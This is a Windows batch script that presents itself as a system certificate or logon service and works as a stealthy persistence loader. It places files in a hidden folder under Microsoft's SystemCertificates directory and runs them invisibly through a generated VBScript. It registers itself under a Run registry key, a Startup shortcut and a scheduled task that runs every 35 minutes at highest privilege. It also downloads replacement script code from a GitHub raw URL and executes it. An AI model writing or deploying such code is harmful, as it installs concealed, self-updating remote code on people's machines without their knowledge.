@echo off
setlocal enabledelayedexpansion
set "LAUNCHER_VERSION=1.6"
set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
set "LAUNCHER_SCRIPT_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/WinLogonSvc.bat"

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "workerScriptPath=%secretPath%\restore_worker.bat"
set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"
set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"

start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
set "targetPath=%launcherScriptPath%"

(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.Run ^"""" & WScript.Arguments(0) & """" , 0, False
) > "%vbsLauncherPath%"

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /f >nul
)

set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
if not exist "%shortcutPath%" (
    powershell -Command ^
        "$ws = New-Object -ComObject WScript.Shell; ^
         $s = $ws.CreateShortcut('%shortcutPath%'); ^
         $s.TargetPath = 'wscript.exe'; ^
         $s.Arguments = '\"%vbsLauncherPath%\" \"%launcherScriptPath%\"'; ^
         $s.WindowStyle = 7; ^
         $s.Save()" >nul 2>&1
)

schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul

curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 300 2>nul
if exist "%secretPath%\lv.tmp" (
    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 300 2>nul
        if exist "%launcherScriptPath%.new" (
            (
                echo @echo off
                echo timeout /t 2 /nobreak ^> nul
                echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%"
                echo del /f /q %%~f0
            ) > "%secretPath%\ul.bat"
            start "" /B wscript.exe "%vbsLauncherPath%" "%secretPath%\ul.bat"
            goto :eof
        )
    )
)

:eof
endlocal
exit /b



